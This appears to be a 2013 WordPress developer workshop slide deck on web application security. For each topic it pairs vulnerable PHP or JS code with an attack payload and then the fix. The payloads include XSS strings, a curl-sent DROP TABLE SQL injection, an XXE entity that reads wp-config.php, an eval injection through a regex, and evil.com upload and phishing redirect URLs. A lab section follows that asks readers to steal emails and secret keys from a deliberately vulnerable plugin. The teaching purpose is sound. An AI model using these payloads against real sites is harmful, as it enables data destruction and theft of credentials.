<div style="text-align: center;">

<h2><del>Security</del> <ins>Hacking</ins> Hands On</h2>

[vip_logo]

VIP Developer Workshop 2013 - Napa, CA - mdawaffe
</div>

<!--nextpage-->

<h2>mdawaffe = Mike Adams</h2>
<ul>
	<li>Automattic for ~7 years</li>
	<li>WordPress Developer ~9 years</li>
	<li>Currently work on Team Data</li>
</ul>

<!--nextpage-->

<h2>Security is a Process</h2>
<ul>
	<li>Not a feature</li>
	<li>Not an afterthought</li>
</ul>

Learn to think like an attacker.

<!--nextpage-->

<h2>Hands On: We're Not Going to Fix Anything</h2>

We're only going to <strong>break stuff</strong> :)

<!--nextpage-->

<h2>Injection Attacks</h2>
<ul>
	<li>XSS</li>
	<li>SQL Injection</li>
	<li>Header Splitting</li>
	<li>Code Execution</li>
	<li>System Execution</li>
</ul>

<!--nextpage-->

<h2>Injection Attacks: Summary</h2>

Unescaped data tricks the service into betraying itself.

Each data format or protocol needs its own methods of sanitizing data.

<h3>Context Is King</h3>
<ul>
	<li>Apps shouldn't sanitize SQL queries with <code>wp_specialchars()</code>.</li>
	<li>Apps shouldn't sanitize URLs with <code>$wpdb->escape()</code>.</li>
	<li>...</li>
</ul>

<!--nextpage-->

<h2>XSS</h2>

<h3>Our Goal as the Attacker</h2>

Inject JavaScript into the site's HTML.

Once we can do that, we can act as a privileged user.

<h3>Example: HTML</h3>

[code lang="php"]
?>
<a href="http://example.com/hello/?ref=<?php
  echo $_GET['ref'];
?>">Hello</a>
<?php
[/code]

<h3>Attack</h3>
[code lang="no-highlight"]
http://example.com/?ref=
  foo%22+onclick%3D%22javascript%3Aalert%28%2FXSS%2F%29
[/code]

<h3>Result</h3>
[code lang=html]
<a
  href="http://example.com/hello/?ref=foo"
  onclick="javascript:alert(/XSS/)"
>Hello</a>
[/code]

<h3>This Would Have Stopped Us</h3>
[code lang="php"]
?>
<a href="<?php
  echo esc_url(
    'http://example.com/hello/?ref=' .
    urlencode( $_GET['ref'] )
  );
?>">Hello</a>
<?php
[/code]
<ul>
	<li><code>esc_html()</code>, <code>esc_attr()</code>, <code>esc_url()</code></li>
	<li><code>esc_js()</code>, <code>json_encode()</code></li>
</ul>

Aside: apps can accidentally break XML output if the output is not first run through <code>ent2ncr()</code>.

<!--nextpage-->

<h2>XSS</h2>

<h3>Example: JS</h3>

[code lang=js]
$( '#error' ).
  append( "Invalid input: " + $( '#input' ).val() );
[/code]

<h3>Attack</h3>
Enter <code>&lt;script&gt;</code> tags in the <code>#input</code>.

<!--nextpage-->

<h2>XSS</h2>

<h3>Example: JS Again</h3>

[code lang=js]
val html = '<a href="' +
  document.location +
  '?fun=1">Click me for fun!</a>';
[/code]

<h3>Attack</h3>

[code lang=no-highlight]
http://example.com/#"onclick="alert(/XSS/);"data-foo="
[/code]

<h3>Result</h3>

[code lang=js]
val html = '<a
  href="http://example.com/#"
  onclick="alert(/XSS/);"
  data-foo="?fun=1"
>Click me for fun!</a>';
[/code]

<h3>This Would Have Stopped Us</h3>
<ul>
	<li>
		Building HTML from strings is just like PHP:
		Apps must escape everything.
	</li>
	<li>jQuery's <code>.html()</code> and <code>.text()</code> are not the same.</li>
	<li>Apps should use jQuery's <code>.attr()</code>, <code>.val()</code>, <code>.data()</code>.</li>
</ul>

<!--nextpage-->

<h2>XSS</h2>

<h3>Example: Every Flash Script Ever</h2>

The way data is transfered between Flash and JS is very hard to secure correctly.

<h3>No Flash = No Flash Vulnerability</h3>

Apps shouldn't use flash.

If they must, flash should be hosted on a cookieless domain.

<!--nextpage-->

<h2>SQL Injection</h2>

<h3>Our Goal as the Attacker</h3>

Read from or write to the site's database in a way it doesn't intend.

<h3>Example</h3>
[code lang=php]
$data = json_decode( $HTTP_RAW_POST_DATA );
$user = $wpdb->get_row(
  "SELECT * FROM `users` WHERE `name` = '{$data->name}'"
);
[/code]

<h3>Attack</h3>
[code lang=bash]
( cat <<'EOF'
{"name":"bob'; DROP TABLE `users`;#'Comment"}
EOF
) | curl -d @- 'http://example.com'
[/code]

<h3>Result</h3>
[code lang=sql]
SELECT *
  FROM `users`
  WHERE `name` = 'bob';
DROP TABLE `users`;#'Comment'
[/code]

<h3>This Would Have Stopped Us</h3>
[code lang=php]
$data = json_decode( $HTTP_RAW_POST_DATA );
$user = $wpdb->get_row( $wpdb->prepare(
  "SELECT * FROM `users` WHERE `name` = %s",
  $data->name
) );
[/code]

<ul>
	<li><code>$wpdb->prepare()</code>, <code>$wpdb->insert()</code>, <code>$wpdb->update()</code></li>
	<li><code>like_escape()</code></li>
</ul>

<!--nextpage-->

<h2>Header Splitting</h2>

<h3>Our Goal as the Attacker</h3>

Header manipulation can lead to all sorts of crazy behavior (including XSS).

Let's just log people out.

<h3>Example</h3>
[code lang=php]
header( "Location: {$_GET['redirect']}" )
[/code]

<h3>Attack</h3>
[code lang=no-highlight]
http://example.com/?redirect=
  http://example.com/%0D
  Set-Cookie:+wordpress_logged_in_123=+
[/code]

<h3>Result</h3>
[code lang=http]
HTTP/1.1 302 Moved Temporarily
Location: http://example.com/
Set-Cookie: wordpress_logged_in_123= 
...
[/code]

<h3>This Would Have Stopped Us</h3>
[code lang=php]
wp_redirect( $_GET['redirect'] );
[/code]

<ul>
	<li>
		This issue with <code>header()</code> was mitigated only as of
		PHP 5.3.11/5.4.0 = April, 2012.
	</li>
	<li>Apps should use <code>wp_redirect()</code>.</li>
</ul>

<!--nextpage-->

<h2>Code Execution</h2>

<h3>Our Goal as the Attacker</h3>

Obvious :)

<h3>Example: <code>eval()</code></h3>
[code lang=php]
eval( $_GET['calculator'] );
[/code]

<h3>Attack</h3>

Obvious :)

<h3>No <code>eval()</code> = No <code>eval()</code> Vulnerability</h3>

Apps shouldn't use <code>eval()</code>.

<!--nextpage-->

<h2>Code Execution</h2>

<h3>Example: Regex</h3>
[code lang=php]
// preg_replace( '//e' ) a.k.a. PREG_REPLACE_EVAL
$content = preg_replace(
  '!<h1>(.*?)</h1>!e',
  '"<h1>" . strtoupper( "$1" ) . "</h1>"',
  $content
);
[/code]

<h3>Attack</h3>
[code lang=html]
<h1>{${eval($_GET[php_code])}}</h1>
[/code]

<h3>Result</h3>
[code lang=php]
// More or less
$something = eval( $_GET['php_code'] );
$content = "<h1>" . strtoupper( $$something ) . "</h1>";
[/code]

<h3>This Would Have Stopped Us</h3>
[code lang=php]
$content = preg_replace_callback(
  '!<h1>(.*?)</h1>!e',
  function( $matches ) {
    return '<h1>' . strtoupper( $matches[1] ) . '</h1>';
  },
  $content
);
[/code]

Apps should use <code>preg_replace_callback()</code> instead of <code>preg_replace( '//e' )</code>

<!--nextpage-->

<h2>Code Execution: Null Bytes</h2>

PHP is based on C, which uses "null terminated" (<code>\0</code>) strings.

Because PHP is awesome, many functions are not "binary safe".

<h3>Example: Regex</h3>
[code lang=php]
$pattern = $_GET['pattern'];
$replace = $_GET['replace'];
echo preg_replace(
  "#$pattern#i",
  $replace,
  'hola mundo'
);
[/code]

<h3>Attack</h3>
[code lang=no-highlight]
http://localhost/naive-search-replace.php
  ?pattern=.%23e%00
  &replace=echo%20phpversion();
[/code]

<h3>Result</h3>
[code lang=html]
5.3.6
[/code]

<h3>This Would Have Stopped Us</h3>
[code lang=php]
$pattern = preg_quote( $_GET['pattern'], '#' );
$replace = $_GET['replace'];
echo preg_replace(
  "#$pattern#i",
  $replace,
  'hola mundo'
);
[/code]

Apps must always use <code>preg_quote()</code>.

<!--nextpage-->

<h2>Bonus: More Null Byte Fun</h2>

Most of PHP's unsafe functions are those that deal with the filesystem.

<h3>Example: Unsafe File Type Check</h3>
[code lang=php]
$wp_upload_dir = wp_upload_dir();
$image_cache_dir = $wp_upload_file . '/image-cache/';

$image_name = basename( $_GET['url'] );
$valid_type = wp_check_filetype( $image_file );

if ( !$valid_type || empty( $valid_type['ext'] ) )
    die( 'Invalid type.' );

$tmp = download_url( $_GET['url'] );
copy( $tmp, $image_cache_dir . '/' . $image_file );
[/code]

<h3>Attack</h3>
[code lang=no-highlight]
http://localhost/image-cache.php
  ?file=http://evil.com/dangerous.php%00ignored.gif
[/code]

<h3>This Would Have Stopped Us</h3>
[code lang=php]
...
$image_name = sanitize_file_name(
  basename( $_GET['url'] )
);
...
[/code]

<ul>
	<li>Apps should use <code>sanitize_file_name()</code>.</li>
	<li>
		As always, site owners must keep WordPress up to date :)
		Core fix for <code>sanitize_file_name()</code>:
		<a href="http://core.trac.wordpress.org/changeset/12072">[12072]</a> = WP 2.8.5 = October, 2009
	</li>
</ul>

<!--nextpage-->

<h3>System Execution</h3>

<ul>
	<li><code>system()</code></li>
	<li><code>exec()</code></li>
	<li><code>passthru()</code></li>
	<li><code>proc_open()</code></li>
	<li><code>shell_exec()</code></li>
	<li><code>``</code> (backticks)</li>
</ul>

<h3>Our Goal as the Attacker</h3>

Pwn.

<h3>No System Calls =<br />No System Execution Vulnerabilities </h3>
<ul>
	<li>These function are dangerous.  Apps shouldn't use them.</li>
	<li><code>escapeshellarg()</code> (but watch out for <code>"-"</code>!)</li>
</ul>

<!--nextpage-->

<h2>XXE: XML eXternal Entity Injection</h2>

XML is awesome. It lets the document author define additional <code>&amp;entities;</code>.

XML is extra awesome. It lets the document author reference <strong>external resources</strong> in those definitions.

PHP is super awesome. By default, it will fetch and use <strong>any external entity</strong> document authors throw at it.

<h3>Our Goal as the Attacker</h3>

<ul>
	<li>Intranet access</li>
	<li>Code disclosure</li>
	<li>XSS</li>
	<li>Botnet</li>
	<li>...</li>
</ul>

<h3>Example</h3>
[code lang=php]
<?php
$xml = simplexml_load_file( $uploaded_file );
?>
<h1><?php printf(
  '%s Uploaded!',
  esc_html( $xml->title )
); ?></h1>
[/code]

<h3>Attack</h3>
[code lang=xml]
<?xml version="1.0" encoding="UTF-8" ?> 
<!DOCTYPE something [
  <!ENTITY
    awesome
    SYSTEM
    "file:///home/web/public_html/wp-config.php"
  >
]>
<something>
    <title>&awesome;</title>
</something>
[/code]

<h3>Result</h3>
[code lang=html]
<h1>define('DB_NAME', 'database_name_here');
define('DB_USER', 'username_here');
define('DB_PASSWORD', 'password_here');
define('SECURE_AUTH_KEY',  'RTYi7!;x...');
define('NONCE_KEY',        'f0h1rhp4...');
define('SECURE_AUTH_SALT', 'f8zFa!>_...');
define('NONCE_SALT',       'UqtXSfr@...');
... Uploaded!</h1>
[/code]

<h3>This Would Have Stopped Us</h3>
[code lang=php]
<?php
libxml_disable_entity_loader( true );
$xml = simplexml_load_file( $uploaded_file );
?>
<h1><?php printf(
  '%s Uploaded!',
  esc_html( $xml->title )
); ?></h1>
[/code]

<ul>
	<li><a href="http://php.net/manual/en/function.libxml-disable-entity-loader.php">libxml_disable_entity_loader()</a>.</li>
	<li><a href="http://php.net/manual/en/function.libxml-set-external-entity-loader.php"> libxml_set_external_entity_loader()</a>.</li>
</ul>

<h3>What Else is Vulnerable?</h3>

Anything that uses libxml.

<ul>
	<li>SimpleXML</li>
	<li>XMLReader</li>
	<li>DOMDocument</li>
	<li>...?</li>
</ul>

Every PHP app ever that manipulates XML has been hit by vulnerabilities of this type.

Including PHP itself: <a href="http://www.cvedetails.com/cve/CVE-2013-1643/">CVE-2013-1643</a> (5.3.23/5.4.13 = <strong>March, 2013</strong>).

<!--nextpage-->

<h2>Injection Attacks: Conclusion</h2>

All I/O must be handled correctly.

Mail headers, TCP packets, SOAP requests, LDAP, JSON, Regex, ... anything with input/output.

<strong>Context is king</strong>.  Each data format or protocol needs its own methods of sanitizing data.

<h3>Tips for Developers</h3>

<ul>
	<li>Validate input immediately.</li>
	<li>Keep data "raw".</li>
	<li>Sanitize (escape) data as late as possible.</li>
	<li>Easy to read is better than clever to write.</li>
</ul>

[code lang=php]
$name = esc_html( $_GET['name'] );
...
echo $name; # is this safe? Depends on ...
[/code]

[code lang=php]
$name = $_GET['name']
...
echo esc_html( $name ); # is this safe? Yes.
[/code]

<!--nextpage-->

<h2>Attacks of Intent</h2>

<ul>
	<li>CSRF</li>
	<li>Clickjacking</li>
	<li>Cross Iframe Communication</li>
	<li>SSRF</li>
	<li>Open Redirects</li>
</ul>

<!--nextpage-->

<h2>Attacks of Intent: Summary</h2>

We want to trick a user into doing something they don't want to.

In addition to verifying the user is logged in and capable of an action, the app needs to make sure the user <strong>intended</strong> to perform that action.

<!--nextpage-->

<h2>CSRF: Cross Site Request Forgery</h2>

<h3>Our Goal as the Attacker</h3>

Without a user knowing, trick them into performing some action the we can't do ourselves.

<strong>Note to Developers</strong>: CSRF mitigation is <strong>useless</strong> if there is an XSS vulnerability.

<h3>Example</h3>
[code lang=php]
if ( '/account/delete' === $_SERVER['REQUEST_URI'] ) {
    delete_account( current_user_id() );
}
[/code]

<h3>Attack</h3>
[code lang=html]
<h1>Look at this cool picture!</h1>
<img src="http://example.com/account/delete" />
[/code]

<h3>Result</h3>
The victim's browser makes a request to that "image" URL and happily sends the victim's example.com cookies along with it.

<h3>This Would Have Stopped Us</h3>
[code lang=php]
if ( '/account/delete' === $_SERVER['REQUEST_URI'] ) {
    // Ensures the user followed a link
    // that had been protected with wp_nonce_url()
    check_admin_referer();

    delete_account( current_user_id() );
}
[/code]

Request made != Request intended.

Actions that require permissions must be protected with some secret unknown to the attacker and that will not be automatically sent by the browser.

<ul>
	<li><code>wp_nonce_url()</code>, <code>wp_nonce_field()</code>, (<code>wp_create_nonce()</code>)</li>
	<li><code>check_admin_referer()</code>, <code>check_ajax_referer()</code> (both badly named), (<code>wp_verify_nonce()</code>)</li>
</ul>

<!--nextpage-->

<h2>Clickjacking</h2>

Our malicious site:
<ul>
	<li>Frames the victim's site in an iframe, and</li>
	<li>Tricks visitors into interacting with one site when they think they are interacting with the other.</li>
</ul>

To do this, the our malicious site employs some form of UI trickery.
<ul>
	<li>Overlaying the victim's site transparently over our malicious site.</li>
	<li>Masking all but some piece of the victim's (now generic looking) UI under our malicious site.</li>
	<li>Using a custom CSS mouse cursor to make the visitor think they are clicking one place, when really they are clicking somewhere else.</li>
</ul>

<h3>This Would Have Stopped Us</h3>
<ul>
	<li><code>X-FRAME-OPTIONS</code> header.</li>
	<li>Framebusting script for older browsers.</li>
</ul>

[code lang=php]
header( 'X-FRAME-OPTIONS: SAMEORIGIN' );
[/code]

[code lang=html]
<html class="inframe">
<head>
<title>Don't frame me, bro!</title>
<style>
.inframe {
  display: none;
}
</style>
<script type="text/javascript">
if ( self === top ) {
  document.documentElement.className =
    document.documentElement.className.
    replace( 'inframe', '' );
} else {
  top.location = self.location;
}
</script>
</head>
[/code]

Why the CSS trick?

[code lang=html]
<iframe sandbox> <!-- HTML5 -->
<iframe security="restricted"> <!-- IE -->
[/code]

<!--nextpage-->

<h2>Cross Iframe Communication</h2>

Old techniques of communicating between iframes are insecure.
<ul>
	<li>Updating URL <code>#fragments</code></li>
	<li><code>window.name</code></li>
	<li>etc.</li>
</ul>

If we see this kind of communication, there may be some spoofing or MITM attack we can perform.

<h3>This Would Have Stopped Us</h3>

<code>window.postMessage( message, origin )</code>

As long as it's used securely... :)

<h3>Tips for Developers</h3>
<ul>
	<li>Always set (and check) <code>origin</code>s when using <code>window.postMessage()</code>.</li>
	<li>Never use <code>'*'</code> as the <code>origin</code>.</li>
	<li>Never use user input as the <code>origin</code>.</li>
</ul>

<!--nextpage-->

<h2>SSRF: Server Side Request Forgery</h2>

<h3>Our Goal as the Attacker</h3>

Trick the victim's server into making a request that only it can make.

This is basically CSRF on the backend.

<h3>Example: Is Image?</h3>
[code lang=php]
$url = filter_var( $_POST['url'], FILTER_VALIDATE_URL );
$is_image = false;

if ( $url ) {
  $image = wp_remote_get( $url );
  $is_image = preg_match(
    '/image/',
    wp_remote_retrieve_header( $image, 'content-type' )
  );
}

if ( $is_image ) {
  die( 'YAY! IMAGE!' );
} else {
  die( 'BOO :( AM SAD' );
}
[/code]

<h3>Attack</h3>

Suppose the victim's server hosts or otherwise has access to some internal service.

[code lang=no-highlight]
url=http://
  the-ceo:12345
  @directory.intranet/users/the-president/
  ?_method=DELETE
[/code]

Not so <code>wp_<strong style="color: red;">remote</strong>_get()</code> now, are you?

<h3>This Would Have Stopped Us</h3>

Apps must make sure the URL's protocol, host, port, etc. all makes sense.

<h3>Tip for Developers</h3>

See core's <a href="http://core.trac.wordpress.org/browser/tags/3.5.1/wp-includes/comment.php#L1954"><code>pingback_ping_source_uri()</code></a> as an example.

Note: The previous <a href="../18/">XXE Example</a> incorporates another SSRF attack example.

<!--nextpage-->

<h2>Open Redirects</h2>

Definition: Resources on a server that will redirect to any <strong>external</strong> resource.

<h3>Example</h3>

[code lang=no-highlight]
http://www.gravatar.com/avatar/
  00000000000000000000000000000000?d={url}
[/code]

[code lang=php]
if ( ! hash_exists( $hash ) ) {
  wp_redirect( $_GET['d'] );
  exit;
}
[/code]

<h3>Attack: Phishing</h3>
[code lang=html]
<p>
  You trust <a
    href="http://www.gravatar.com/avatar/0
      ?d=http://evil.com/"
  >Gravatar</a>, right?
</p>
[/code]

<h3>Attack: OAuth</h3>

If an OAuth client has an open redirect, and the OAuth service is flexible enough with their redirect URLs, we can steal credentials :)

<h3>This Would Have Stopped Us</h3>
[code lang=php]
if ( ! hash_exists( $hash ) ) {
  wp_safe_redirect( $_GET['d'] );
  exit;
}
[/code]

Apps must only redirect to trusted URLs.
<ul>
	<li><code>wp_safe_redirect()</code></li>
	<li>Protect redirects with nonces or some other CSRF mitigation.</li>
</ul>

Note: Gravatar now serves external images directly, rather than redirecting to arbitrary URLs.

<!--nextpage-->

<h2>Attacks of Intent: Conclusion</h2>

Food for Developers' thoughts:
<ul>
	<li>Confidentiality: Does it matter who sees your data?</li>
	<li>Authentication: Do you need to know who sent the data you get? Do you need to know who receive the data you send?</li>
	<li>What would happen if someone tried to forge the request/input?</li>
	<li>What would happen if someone sent the requests you expect, but in the wrong order?</li>
</ul>

Apps must not allow requests to be spoofed: verify intent with secrets unavailable to the outside.

<!--nextpage-->

<h2>Gotchas</h2>

Cute bugs caused by bad code.

<h3>Permissions: <code>current_user_can()</code> &gt; <code>is_user_logged_in()</code></h3>
Apps must verify the user has permission to view, create, edit, etc.

<h3>Strict Equality Checking</h3>
<ul>
	<li><code>===</code></li>
	<li><code>in_array( $needle, $haystack, true )</code></li>
</ul>
[code lang=php]
10 == '10ab7c4f2e' # true
 0 == 'a75be5c82d' # true
[/code]

This is especially important when apps verify passwords, keys, hashes, etc.

<a href="http://php.net/manual/en/types.comparisons.php">PHP Type Comparisons</a>.

<h3>The App's MySQL Collation is Probably Case Insensitive</h3>
[code lang=sql]
SELECT `id`, `secret`
  FROM `user_secrets`
  WHERE `secret` = 'abc123';
--> 1, AbC123
[/code]

<h4>This Would Have Stopped Us</h4>
[code lang=sql]
SELECT `id`, `secret`
  FROM `user_secrets`
  WHERE `secret` = BINARY 'abc123';
--> 7, abc123
[/code]

<h3>Signatures: <code>hash_hmac()</code> &gt; <code>md5()</code></h3>
[code lang=php]
$hash = md5( $key . $data ); # Boo
$hash = hash_hmac( 'md5', $data, $key ); # Yay!
[/code]

<a href="http://en.wikipedia.org/wiki/Length_extension_attack">Hash length extension attack</a>.

<h3>JS Sanitation Is Important</h3>

We don't need quotes to do anything in JavaScript.

[code lang=js]
/foo/.substr(1, 3); // "foo"
[/code]

In fact, we only need the following six characters :)

<code>()[]!+</code>

<a href="http://patriciopalladino.com/blog/2012/08/09/non-alphanumeric-javascript.html">http://patriciopalladino.com/blog/2012/08/09/non-alphanumeric-javascript.html</a>

<h3>SSL Host Verification Off by Default :(</h3>
[code lang=php]
file_get_contents( 'https://example.com/' ); // :(
[/code]

<h4>This Would Have Stopped Us</h4>
[code lang=php]
$curl = curl_init( 'https://example.com/' );
curl_setopt( $curl, CURLOPT_RETURNTRANSFER, true );
curl_exec( $curl );
[/code]

Apps should always use cURL. (Or <code>wp_remote_*()</code>.)

<h3><code>wp_redirect()</code> Doesn't Exit</h3>
[code lang=php]
<?php
require 'wp-load.php';
if (
  empty( $_GET['token'] )
||
  'some-token' !== $_GET['token']
)
  wp_safe_redirect( 'Location: /' );

readfile( __FILE__ );

exit();
[/code]

<h4>Attack</h4>

[code lang=bash]
$ curl -v http://192.168.1.40/trunk/demo.php
* About to connect() to 192.168.1.40 port 80 (#0)
*   Trying 192.168.1.40... connected
> GET /trunk/demo.php HTTP/1.1
> User-Agent: curl/7.22.0 (x86_64-pc-linux-gnu) libcurl/7.22.0 OpenSSL/1.0.1 zlib/1.2.3.4 libidn/1.23 librtmp/2.3
> Host: 192.168.1.40
> Accept: */*
> 
< HTTP/1.1 302 Found
< Date: Fri, 12 Apr 2013 13:50:58 GMT
< Server: Apache/2.2.22 (Ubuntu)
< X-Powered-By: PHP/5.4.13-2~precise+1
< Location: http://192.168.1.35/trunk/wp-admin/
< Vary: Accept-Encoding
< Content-Length: 164
< Content-Type: text/html
< 
<?php
require 'wp-load.php';
if (
  empty( $_GET['token'] )
||
  'some-token' !== $_GET['token']
)
  wp_safe_redirect( 'Location: /' );

readfile( __FILE__ );

exit();
* Connection #0 to host 192.168.1.40 left intact
* Closing connection #0
[/code]

<h4>This Would Have Stopped Us</h4>
[code lang=php]
if (
  empty( $_GET['token'] )
||
  'some-token' !== $_GET['token']
) {
  wp_safe_redirect( 'Location: /' );
  exit();
}
[/code]

<!--nextpage-->

<h2>Links for Developers</h2>

<h3>Survive The Deep End: PHP Security</h3>
<a href="http://phpsecurity.readthedocs.org/">http://phpsecurity.readthedocs.org/</a>

<h3>OWASP: The Open Web Application Security Project</h3>
<a href="http://owasp.com/">http://owasp.com/</a>

<!--nextpage-->

<h2>Time to Become a H4x0R</h2>

There is a chat widget enabled in the sidebar of this blog.

The code is at wp-content/plugins/Chat-Sploit/

Feel free to read it.

<h3>Your Goal as the Attacker</h3>
While logged in as the user "author" (password: "author"),
<ul>
	<li>Make the "admin" user say something,</li>
	<li>Git a list of all user's email addresses,</li>
	<li>Get the site's <code>SECRET_KEY</code>s ...,</li>
	<li>... and <code>SECRET_SALT</code>s.</li>
</ul>

Note: That's a <code>&lt;ul&gt;</code>.  Do these attacks in whatever order you like.

<!--nextpage-->

<h2>Time to Become a 1337 H4x0R</h2>

Log in as "admin" (password: "admin") and activate the Member's Only plugin.

(The default settings should be fine.)

Now, <strong>log out entirely</strong>.

While logged out, do everything again :)
<ul>
	<li>Make the "admin" user say something,</li>
	<li>Git a list of all user's email addresses,</li>
	<li>Get the site's <code>SECRET_KEY</code>s ...,</li>
	<li>... and <code>SECRET_SALT</code>s.</li>
</ul>

Again, in whatever order you like.